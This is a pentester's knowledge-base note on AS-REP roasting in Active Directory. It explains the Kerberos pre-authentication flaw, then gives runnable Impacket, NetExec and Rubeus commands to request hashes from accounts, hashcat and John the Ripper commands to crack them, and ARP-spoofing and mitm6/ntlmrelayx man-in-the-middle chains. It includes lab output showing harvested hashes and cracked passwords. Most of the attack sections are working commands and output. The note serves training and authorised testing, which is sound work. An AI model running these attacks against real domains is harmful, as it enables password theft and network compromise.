---
created: 2026-08-03
updated: 2026-10-19
tags:
  - AD
  - AD_attacks
  - Kerberos
---
>[!note] [`T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1558/004/).

## `AS-REP` roasting

- At the beginning of Kerberos authentication, a client requests a **TGT** (Ticket-Granting Ticket) from the KDC (Key Distribution Center) by sending an Authentication Service Request (`AS-REQ`). This request is sent before the client has any credentials in the current session.
- The `AS-REQ` typically includes **pre-authentication data**: a timestamp encrypted with a key derived from the client's password. This key is called the client's **long-term key**.
- The AS decrypts the timestamp using the corresponding key it stores for the account and verifies that it falls within the acceptable clock skews (5 minutes by default). This demonstrates that the client possesses the account's long-term key without transmitting the key itself.

>[!note] See [[Kerberos#`1.` AS exchange (`KRB_AS_REQ` / `KRB_AS_REP`)]].

- Kerberos pre-authentication can be disabled for an account through the `DONT_REQUIRE_PREAUTH` flag in the `userAccountControl` attribute. When this flag is set, the AS can issue an `AS-REP` without first verifying that the requester actually holds the client's long-term key.
- Therefore, you can request an `AS-REP` for an account with pre-authentication disabled without knowing the account's password or long-term key.
---
- Part of `AS-REP` — the portion intended for the client — is encrypted with the client's long-term key. If you capture the response, you can extract this material and attempt to **crack the password offline**: take a candidate password, derive the corresponding Kerberos key, and attempt to decrypt the captured data. A successful decryption identifies the correct candidate password and, consequently, the corresponding long-term key. 

> **`AS-REP` roasting** is a Kerberos attack in which an attacker requests an `AS-REP` (Authentication Service Response) for a domain account with pre-authentication disabled and uses the returned encrypted material to attempt offline password cracking.

>[!note] The traffic generated during the roasting consists of standard `AS-REQ` requests — generating Event `4768` (A Kerberos authentication ticket was requested) on the Domain Controller, but no failed logons (`4625`).

>[!note] See [`Use the UserAccountControl flags to manipulate user account properties — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties).

## Executing `AS-REP` roasting

>[!important] Computer accounts and gMSAs enforce pre-authentication by default and have long, complex passwords. Target **human user accounts** with `DONT_REQUIRE_PREAUTH` set.

### From Linux

#### `GetNPUsers.py`

- [`GetNPUsers.py`](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) from Impacket can request `AS-REP`s for accounts with Kerberos pre-authentication disabled **both with and without valid domain credentials**. 
- If credentials are provided, the tool can pull target domain accounts automatically; otherwise you must submit a list of usernames. 
- `GetNPUsers.py` checks whether `DONT_REQUIRE_PREAUTH` is set for each target account, and if so, performs the `AS-REP` roasting attack, i.e., requests `AS-REP`s.
---

- Perform `AS-REP` roasting without valid domain credentials:

```bash
GetNPUsers.py example.com/ -usersfile usernames.txt -request -dc-ip 10.10.11.5
```

>[!tip]+
> - To only check which accounts have `DONT_REQUIRE_PREAUTH` set, but without actually requesting `AS-REP`s, omit the `-request` option:
> 
> ```bash
> python3 GetNPUsers.py example.com/ -usersfile usernames.txt -dc-ip 10.10.11.5
> ```

>[!note]+ To perform `AS-REP` roasting without valid domain credentials, you need to get a list of valid usernames first. See [[Username enumeration in AD]].
> ```bash
> kerbrute userenum -d example.com --dc 10.10.11.5 names.txt
> ```

- Authenticate using username and password:

```bash
GetNPUsers.py example.com/'jdoe':'passwd123' -request -outputfile AS-REP_hashes.txt -dc-ip 10.10.11.5
```

>[!example]-
> ```bash
> GetNPUsers.py inlanefreight.local/'htb-student':'HTB_@cademy_stdnt!' -request -outputfile AS-REP_hashes.txt -dc-ip 10.129.205.35
> ```
> ```bash
> Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 
> 
> Name         MemberOf  PasswordLastSet             LastLogon                   UAC      
> -----------  --------  --------------------------  --------------------------  --------
> amber.smith            2023-03-30 09:40:23.135840  2023-04-06 07:48:23.096956  0x410200 
> jenna.smith            2022-10-14 08:00:00.581111  2023-04-06 07:48:23.096956  0x410200 
> carole.rose            2022-10-14 08:00:03.377990  2023-04-06 07:48:23.096956  0x410200 
> 
> 
> 
> $krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:2980ea1c4c290bcb217f2589ea346900$56e28f59bcf57db2fd503e978023f072708af4f698bd531f712873fa2568e475ac189b13a3777bb6cfd063231ed9d81e2b635cc93971af6e589687543e2fa28fd7c547b2fe3dd307b45251a61cba0415c45c5f39a477cf9174f235305e9e405a516f0485da7635d375afaede8bdd29d183a35408f1abff64b1dbf7fb1dbde408d9ca4a52e38ef27a0f5847b6ad42bac2dfe5cff8dfac3683a7163f44f82a17bb63f2651f5fd5ce249ea2373b7c85447fe2e4e0b1ab76d0ea437c94b19e56901857937cb39d54ede87a0b376de6091693565f64b637a3b3ac9d3fa87008fca0ab9358696a044a923169b2543d9164205821538bd5f7e884878adc
> $krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:1e78a3b9932a2430a6491c6f24c2dd53$2424d6bd034d5c38126ce6aef99f4c077ced88e771c7f6fdbe73e0ae05fded549993cad0804d70cca1e782c6705ffa3f21b89e1ec2f55e0efab6cf1967445cff23da74d512cea6e152e99da0d3c06c75828aecd2cbd553d38bfdc700a3dca1c3e023fe2cb39146f51331f934bfa8355a463d7fcbe70df4b64700e160b6d8b3e70720adc3dbc7cc06fac55ee2482e79a8a5300e998d17f1cd97b74b8144adb597c8ed77d97ed7b433a5fab9b7e6ef356175c12c45fd14477e70778fb47d5a88b83d5c7c994ededb256024db64017aae32bd145b2639d5e21faf806abc60c773a8c066119b11b6058c3907cef27d839cc925aefcf34620ea68ae48
> $krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL:31d46a320ea7f1418ce721cf42059b31$6db1c52dc3d965eebb6ae1b571b874423451c5450bcf6cd9ac06b097f755d11be4062040cc008527e9336b20fc7b38ace030a15e52f1440e8d7e7b37e9d24ce7704f533d5a06c9b0c02d6e7d14cc97413636ea8f8b61380b9737c5f5ee4491e84681f780b91c9a4e07f58e9bd6cd90f029ceebb67d70a9751e6a9ff6beb5193c70076d9b39712b6b497252ae178e16c61b6e4847fe4d4758119a963d16dde2780ef9fe7e1a535c8d1a9d6f447eba2c4b0a942fbc3bfee8054e9d346ea94e4f1bbfb8b209317748f481c9f370d7ccd29c14e53d0d323b572c96e7a9f559c3932f2ea266401ccfc9cd7ea078b8d5f6e30b30bda8c31f9388c7246d
> ```

- Authenticate using an NT hash ([[Pass-the-Hash]]):

```bash
GetNPUsers.py example.com/'jdoe' -hashes ':d503a8571a79baf9b951884f350ad048' -request -outputfile AS-REP_hashes.txt -dc-ip 10.10.11.5
```

- Authenticate using a Kerberos cache (`ccache`):

```bash
GetNPUsers.py example.com/'jdoe' -k -no-pass -request -outputfile AS-REP_hashes.txt -dc-ip 10.10.11.5
```

- Target a specific user, skipping enumeration:

```bash
GetNPUsers.py example.com/ -user 'rroe' -request -outputfile REP_rroe.txt -dc-ip 10.10.11.5
```

| Option        | Description                                                                                  |
| ------------- | -------------------------------------------------------------------------------------------- |
| `-dc-ip`      | IP address of the target Domain Controller.                                                  |
| `-usersfile`  | Path to a text file containing target usernames (one per line) for unauthenticated roasting. |
| `-request`    | Requests `AS-REP` for vulnerable accounts and prints hashes in Hashcat/JtR format.           |
| `-outputfile` | Saves the output hashes directly to the specified file.                                      |
| `-format`     | Specify hash format (`hashcat` or `john`; default: `hashcat`).                               |
| `-user`       | Target a specific user, skipping enumeration.                                                |
| `-hashes`     | Authenticate using LM:NT hash (Pass-the-Hash).                                               |
| `-k`          | Use Kerberos cache (`ccache`) for authentication.                                            |

> [!example]-
> ```bash
> impacket-GetNPUsers -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
> ```
> 
> ```bash
> Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
> 
> Password:
> Name      MemberOf                                           PasswordLastSet             LastLogon                  
> --------  -------------------------------------------------  --------------------------  --------------------------
> hsimpson  CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-03-15 10:14:22.127432  2026-07-30 08:12:04.606617
> 
> $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c02e1a491f...$05dfa41a87c1...
> ```
#### `NetExec`

- [`NetExec`](https://github.com/Pennyw0rth/NetExec)'s `ldap` module supports `AS-REP` roasting attacks. With valid domain credentials, it enumerates vulnerable users via LDAP and requests their `AS-REP`s in a single pass.
---
- Enumerate users with Kerberos pre-authentication disabled and perform `AS-REP` roasting:

```bash
nxc ldap 10.10.11.5 -u 'jdoe' -p 'passwd123' --asreproast AS-REP_hashes.txt
```

- Target a specific user:

```bash
nxc ldap 10.10.11.5 -u 'rroe' -p '' --asreproast AS-REP_hashes.txt
```
### From Windows

#### Enumerating accounts with Kerberos pre-authentication disabled

- Enumerate users with Kerberos pre-authentication disabled using PowerShell (`ActiveDirectory` module):

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName, UserPrincipalName, Enabled
```

- Using [`Get-DomainUser`](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) (`PowerView`):

```powershell
Import-Module .\PowerView.ps1
```
```powershell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

- Using [`Rubeus`](https://github.com/GhostPack/Rubeus#preauthscan):

```powershell
.\Rubeus.exe asreproast /stats /nowrap
```

```powershell
.\Rubeus.exe preauthscan /users:usernames.txt 
```

>[!example]-
> ```powershell
> .\Rubeus.exe asreproast /stats /nowrap
> ```
> 
> ```powershell
>    ______        _
>   (_____ \      | |
>    _____) )_   _| |__  _____ _   _  ___
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/
> 
>   v2.2.0
> 
> 
> [*] Action: AS-REP roasting
> 
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> 
> [*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
> [*] SamAccountName         : amber.smith
> [*] DistinguishedName      : CN=amber.smith,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> [*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
> [*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\amber.smith'
> [+] AS-REQ w/o preauth successful!
> [*] AS-REP hash:
> 
>       $krb5asrep$amber.smith@INLANEFREIGHT.LOCAL:2BA5EED848DB933090ACF973CDD5602B$EFDF392FC5378FA331A74BD110791FBA41096146E97F098B8C67737EACE84BCCB5A0B411A2E0C7CB37473C30E0BACD4B2A26279D0FBEEE1CE96EA44E4A068C8399C5E6FD5F8914C5D5E7C5F84BA74B03EF67A37C08C7B461793F61B7F5FFEAA7E981A4818612F9116454D71D0ECD94BB54EAA89146A349152871624DA1111927E765DAB286B29F2F72EA66C204D9D4A1A185A57011AFE5F671E25BCC0BBDA829222EC9137F344F74FACAE8DA21DE1489BBB300F4BCDFED564A76AF6BD3E0950FB2EB10C0A9B71CBE791B91010C5FC2422EE7B9EFFB20099CAB1E056018D611C2971C5C2DBF268818CF775726C18714C02681783A8D13307B8D74
> 
> [*] SamAccountName         : jenna.smith
> [*] DistinguishedName      : CN=jenna.smith,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> [*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
> [*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\jenna.smith'
> [+] AS-REQ w/o preauth successful!
> [*] AS-REP hash:
> 
>       $krb5asrep$jenna.smith@INLANEFREIGHT.LOCAL:0CAB0D5ADF7E6D37A89F09554569C1A1$0A895555175F844546290F0EAA6DDAEDE225E69A9DC3FD3E5787F26B1DC5BF8AF80FF903FBF54680FD8DBE4118D429C8A3691B8CF8597F05C6BC5ED05A9A8E021DCB87510D2A54FC1F06DD644724914662419DC426E8525C32F71F12C304F4675A579898CB62C743F7A24EBBCBBD10B337AD9C328ADAA58567EF7D63051FE045758C60084AB7A6A6AF1F2294BCCEB1749D8D551627501B44A68E10F9015754F9AD7EF15ACB92FA63C66B53472ED19C37C2B4B3A15010DCECA56994480B251375D56387C5DB12EFFFD8BBDA3C376F7C2E2E1FF6F40A91FDE28F9ABB290653738039811478D8B9A1FF36DE4051944BE571A7CA4AD532CA21DEFFC1
> 
> [*] SamAccountName         : carole.rose
> [*] DistinguishedName      : CN=carole.rose,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> [*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
> [*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\carole.rose'
> [+] AS-REQ w/o preauth successful!
> [*] AS-REP hash:
> 
>       $krb5asrep$carole.rose@INLANEFREIGHT.LOCAL:9AF367AD9016C2AA7C9F8CE8BC762866$14B536049B0E7832CD7A7A2F481D35C46B44EB5E6F1F0F1B3F81D9D8FBCA72CCE53308B6437E56FA3703774EF5D1D106000F0E1F899F53D7874015E809D81C300E8EECDA075AA79B6ACAB089E961084CE58D945FDBC3F375708A960B817D2BD5AE2E9B1951F7BCA8EA0DD53F2F76ADE659F4310BFAC56C8FC57DC2F4CF1FF564B9B5C0D1061DB3198F6EC61A4CB5502029AEAAC2655D006F8681E6141791359A9C44723B48AEA820CBA23FFC6BD2E89520729D5F2840EE579DA216EB5F899638CC7EB7CF062CA19851F3BE448E98BF45D505AD2835F7D0FF26CAC0A06F6C26075EADD61ADE01BF199F3C3B54FD3B85A29718FFEBCC3ACCF20101
> ```
> 
> ![[Rubeus_stats.png]]
#### `Rubeus`

- [`Rubeus`](https://github.com/GhostPack/Rubeus#asreproast) supports `AS-REP` roasting attacks via the `asreproast` sub-command.
- Enumerate users automatically and perform `AS-REP` roasting for those that have `DONT_REQUIRE_PREAUTH` set:

```powershell
.\Rubeus.exe asreproast /domain:example.com /dc:dc01.example.com /outfile:AS-REP_hashes.txt
```

- `AS-REP`-roast a specific user:

```powershell
.\Rubeus.exe asreproast /user:rroe /domain:example.com /dc:dc01.example.com /outfile:AS-REP_hashes.txt
```

- `AS-REP`-roast a list of users specified in a file:

```powershell
.\Rubeus.exe asreproast /users:usernames.txt /nowrap
```

>[!note]- `Rubeus asreproast` options
> | Option                  | Description                                                   |
> | ----------------------- | ------------------------------------------------------------- |
> | `/user:username`        | Target a specific user account for `AS-REP` roasting.         |
> | `/users:file.txt`       | File with a list of target users.  |
> | `/domain:domain.local`  | Target domain.                                                |
> | `/dc:dc01.domain.local` | Target Domain Controller.                                     |
> | `/ou:"LDAP OU"`         | Limit search to a specific Organizational Unit.               |
> | `/format:hashcat\|john` | Hash output format (`hashcat` or `john`; default: `hashcat`). |
> | `/outfile:file.txt`     | Write roasting output hashes to a file.                       |
> | `/nowrap`               | Output hashes without line wrapping for easy copying.         |
> | `/stats`                | Display vulnerable accounts count without requesting tickets. |
> | `/aes`                  | Request AES-encrypted `AS-REP`s instead of the RC4.   |
> | `/des`                  | Request DES-encrypted `AS-REP`s (legacy environments).   |

> [!example]-
> ```powershell
> PS C:\Tools> .\Rubeus.exe asreproast /nowrap
> ```
> 
> ```powershell
>    ______        _                      
>   (_____ \      | |                     
>    _____) )_   _| |__  _____ _   _  ___ 
>   |  __  /| | | |  _ \| ___ | | | |/___)
>   | |  \ \| |_| | |_) ) ____| |_| |___ |
>   |_|   |_|____/|____/|_____)____/(___/ 
> 
>   v2.0.2 
> 
> [*] Action: AS-REP Roasting
> 
> [*] Target Domain          : INLANEFREIGHT.LOCAL
> [*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
> 
> [*] SamAccountName         : hsimpson
> [*] DistinguishedName      : CN=Homer Simpson,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> [*] PwdLastSet             : 3/15/2022 10:14:22 AM
> [*] Supported ETypes       : RC4_HMAC_DEFAULT
> [*] Hash                   : $krb5asrep$23$hsimpson@INLANEFREIGHT.LOCAL:b9c02e1a491f...$05dfa41a87c1...
> ```

## Cracking `AS-REP` hashes

- `AS-REP` hashes can be cracked offline using Hashcat or JohnTheRipper.
- The encryption type (`enctype`) used in the `AS-REP` determines how fast the user's password can be recovered, depending on the cryptographic algorithms in use.

| Encryption type (`enctype`) | Value         | Hashcat mode | JtR format  | Description                                                                          |
| --------------------------- | ------------- | ------------ | ----------- | ------------------------------------------------------------------------------------ |
| `RC4-HMAC`                  | `23` (`0x17`) | `18200`      | `krb5asrep` | Encrypted using a key derived directly from the account's NT hash; fastest to crack. |
| `AES128-CTS-HMAC-SHA1-96`   | `17` (`0x11`) | `19800`      | `krb5asrep` | Key derivation uses PBKDF2 with 4,096 iterations; significantly slower.              |
| `AES256-CTS-HMAC-SHA1-96`   | `18` (`0x12`) | `19900`      | `krb5asrep` | PBKDF2 with 4,096 iterations and 256-bit key; slowest to crack.                      |

### Hashcat

- Crack RC4 `AS-REP` hashes (`etype 23`, mode `18200`):

```bash
hashcat -m 18200 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
```

- Crack AES-128 `AS-REP` hashes (`etype 17`, mode `19800`):

```bash
hashcat -m 19800 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
```

- Crack AES-256 `AS-REP` hashes (`etype 18`, mode `19900`):

```bash
hashcat -m 19900 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt
```

- Run a wordlist with mutation rules to catch minor password variations:

```bash
hashcat -m 18200 -a 0 AS-REP_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

- Display hashes already cracked in a previous run (from the potfile):

```bash
hashcat -m 18200 AS-REP_hashes.txt --show
```

>[!note] See [[Hashcat]].
### John the Ripper

- Crack `AS-REP` hashes with [John the Ripper](https://www.openwall.com/john/) using the `krb5asrep` format:

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt AS-REP_hashes.txt
```

- Display cracked passwords once the run completes:

```bash
john --format=krb5asrep AS-REP_hashes.txt --show
```

> [!example]-
> ```bash
> john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt AS-REP_hashes.txt
> ```
> 
> ```bash
> Using default input encoding: UTF-8
> Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
> Will run 4 OpenMP threads
> Press 'q' or Ctrl-C to abort, almost any other key for status
> jasmine          ($krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL)     
> teddybear        ($krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL)     
> 2g 0:00:00:13 DONE (2026-10-19 09:37) 0.1499g/s 1075Kp/s 1075Kc/s 1075KC/s !!12Honey..*7¡Vamos!
> Use the "--show" option to display all of the cracked passwords reliably
> Session completed. 
> ```

>[!note] See [[🛠️ JohnTheRipper]].
### Validating recovered credentials

- You can verify the cracked password against domain services using [`NetExec`](https://github.com/Pennyw0rth/NetExec) over SMB:

```bash
nxc smb 10.10.11.5 -u 'jdoe' -p 'passwd123'
```

- Over WinRM:

```bash
nxc winrm 10.10.11.5 -u 'jdoe' -p 'passwd123'
```


## `AS-REP` roast MitM

- Standard `AS-REP` roasting requires the target account to have `DONT_REQUIRE_PREAUTH` set.
- A MitM variant **removes this prerequisite by capturing legitimate `AS-REP`s off the wire** instead of requesting them from the KDC. Because the `enc-part` of every `AS-REP` is encrypted with the account's long-term key regardless of whether pre-authentication was performed, a captured `AS-REP` is just as crackable as one obtained from a pre-auth-disabled account.
- The result: **every user who authenticates on the monitored segment becomes roastable**, not only the accounts flagged with `DONT_REQUIRE_PREAUTH`.

---

- To capture `AS-REP`s you must sit in-path for Kerberos traffic (TCP/UDP port `88`) between the clients and the Domain Controller. On a switched LAN this is normally achieved with **ARP spoofing**; rogue DHCPv6 (IPv6 takeover) can also place you in-path.
- The `AS-REQ`/`AS-REP` exchange happens when a client first authenticates to the domain in a session — logon, unlock, or ticket renewal — so capture is **opportunistic** rather than on-demand, which limits its reliability compared to standard `AS-REP` roasting.

> [!warning] Name-resolution poisoning tools such as `Responder` and `Inveigh`, and the `mitm6` + `ntlmrelayx` chain, capture **NetNTLM** material or relay **NTLM** authentication — they do **not** capture Kerberos `AS-REP`s (see [[#mitm6 and NTLM relay]] below). For `AS-REP` capture, use a Kerberos-aware interceptor such as `ASRepCatcher`.

### `ASRepCatcher`

- [`ASRepCatcher`](https://github.com/Yaxxine7/ASRepCatcher) performs the MitM `AS-REP` roast end to end: it ARP-spoofs between the clients and the Domain Controller, intercepts the Kerberos exchange, and writes the captured `AS-REP`s in Hashcat/JtR format. It needs no domain credentials and no pre-auth-disabled accounts.
- Install it:

```bash
python3 -m pip install ASRepCatcher
```

- **Relay mode** (default, recommended): client `AS-REQ`s are relayed to the DC through your host, and the returned `AS-REP`s are captured. `ASRepCatcher` rewrites the relayed `AS-REQ` to advertise only RC4 (`etype 23`), so — when the domain still permits RC4 — the DC answers with an RC4-encrypted `AS-REP` (`$krb5asrep$23$`), the fastest hash to crack:

```bash
sudo ASRepCatcher relay -dc 10.10.11.5
```

- **Listen mode** (passive): only the gateway's ARP cache is poisoned, and `AS-REP`s sent to clients are read without being altered. This modifies no packets but cannot force the RC4 downgrade:

```bash
sudo ASRepCatcher listen
```

- Restrict the attack to specific clients and write the hashes to a file:

```bash
sudo ASRepCatcher relay -dc 10.10.11.5 -t 10.10.11.25,10.10.11.26 -outfile AS-REP_hashes.txt
```

>[!note]- `ASRepCatcher` options
> | Option               | Description                                                                    |
> | -------------------- | ------------------------------------------------------------------------------ |
> | `{relay,listen}`     | Select the capture mode.                                                        |
> | `-dc`                | Set the Domain Controller IP.                                                   |
> | `-gw`                | Set the gateway IP; use the DC IP when the DC shares the VLAN.                  |
> | `-t`                 | Target specific client IPs (comma-separated) or a subnet.                      |
> | `-tf`                | Read target client IPs from a file.                                            |
> | `-iface`             | Select the network interface.                                                   |
> | `-outfile`           | Write captured hashes to a file.                                                |
> | `-usersfile`         | Write discovered usernames to a file.                                           |
> | `-format`            | Set the hash output format (`hashcat` or `john`; default: `hashcat`).           |
> | `--stop-spoofing`    | Stop poisoning a client once its hash is captured (avoid when IPs are shared).  |
> | `--disable-spoofing` | Skip the built-in ARP spoofing and supply your own MitM.                        |

- Crack the captured hashes as described in [[#Cracking AS-REP hashes]]; RC4 captures use Hashcat mode `18200`.

> [!warning] Modern domains increasingly disable RC4. When the DC's policy forbids it, the forced-downgrade `AS-REQ` is rejected with `KDC_ERR_ETYPE_NOTSUPP` (error `0x12`) and relay mode yields no RC4 hash. Captured AES `AS-REP`s (`$krb5asrep$17$`/`$18$`) are still crackable, only far slower (modes `19800`/`19900`).

> [!note] The RC4 downgrade is most effective against legacy clients (Windows 7 / Server 2008 R2 and earlier) and non-Windows Kerberos implementations. Current Windows clients and AES-only domains limit its usefulness.

### Capturing `AS-REQ` pre-authentication

- A related technique targets the **`AS-REQ`** instead of the `AS-REP`. With pre-authentication enabled, the client sends a timestamp encrypted with its long-term key in the `PA-ENC-TIMESTAMP` field; capturing it enables the same offline password attack. This yields a distinct hash — `$krb5pa$` (Hashcat mode `7500`) — not an `AS-REP` hash.
- Extract it from live traffic or a packet capture with [`Pcredz`](https://github.com/lgandx/PCredz), which writes the material in crackable form:

```bash
sudo Pcredz -i eth0 -v
```

- Crack with Hashcat mode `7500`:

```bash
hashcat -m 7500 -a 0 krb5pa_hashes.txt /usr/share/wordlists/rockyou.txt
```

### `mitm6` and NTLM relay

> [!warning] The `mitm6` + `ntlmrelayx` chain is frequently confused with `AS-REP` capture, but it is an **NTLM-relay** attack and never touches Kerberos `AS-REP`s — `ntlmrelayx` has no Kerberos-capture option. It is described here only to clear up that confusion; it is a different attack, not a way to obtain `AS-REP` hashes.

- [`mitm6`](https://github.com/dirkjanm/mitm6) abuses the fact that Windows enables IPv6 by default and prefers it over IPv4. Even on IPv4-only networks, Windows hosts periodically broadcast **DHCPv6** solicitations.
- `mitm6` answers those solicitations with rogue DHCPv6 replies that assign the victim a link-local IPv6 address and set the **attacker's host as the victim's primary DNS server**. Because Windows prefers IPv6 DNS, the victim then sends its DNS queries to the attacker, who selectively answers them — for example resolving `WPAD` to the attacker — to pull the victim's traffic through the attacker's host.
- Paired with Impacket's [`ntlmrelayx.py`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), the captured NTLM authentication is relayed to a target service — commonly LDAP/LDAPS on the Domain Controller — to create a machine account or configure **resource-based constrained delegation (RBCD)** for privilege escalation:

```bash
sudo mitm6 -d example.com -i eth0
```

```bash
sudo ntlmrelayx.py -6 -t ldaps://10.10.11.5 -wh fakewpad.example.com -l loot
```

> [!warning] Run `mitm6` only in short bursts. Acting as the IPv6 DNS server for a segment will eventually break name resolution for legitimate traffic across the network.

## References and further reading

- [`T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1558/004/)
---
- [`Use the UserAccountControl flags to manipulate user account properties — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
- [`RFC 4120: The Kerberos Network Authentication Service (V5) — RFC Editor`](https://www.rfc-editor.org/info/rfc4120)
---

- [`Roasting AS-REPs — Will Schroeder, SpecterOps`](https://specterops.io/blog/2017/01/17/roasting-as-reps/)
- [`ASREProast — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/roasting/asreproast)
- [`AS-REP Roasting — Hacking Articles`](https://www.hackingarticles.in/as-rep-roasting/)
- [`Obtaining AS-REP Hashes Through ARP Poisoning — Sprocket Security`](https://www.sprocketsecurity.com/blog/obtaining-as-rep-hashes-through-arp-poisoning)
---

- [`Roasting AS-REPs — HarmJ0y (SpecterOps)`](https://www.harmj0y.net/blog/redteaming/roasting-as-reps/)
- [`AS-REP Roasting — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/as-rep-roasting)
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Impacket GetNPUsers — Fortra GitHub`](https://github.com/fortra/impacket)
- [`ASRepCatcher — Yaxxine7 GitHub`](https://github.com/Yaxxine7/ASRepCatcher)
- [`mitm6 — dirkjanm GitHub`](https://github.com/dirkjanm/mitm6)
- [`Pcredz — lgandx GitHub`](https://github.com/lgandx/PCredz)
- [`Event 4768 — A Kerberos authentication ticket (TGT) was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [`UserAccountControl Flags — Microsoft Learn`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)
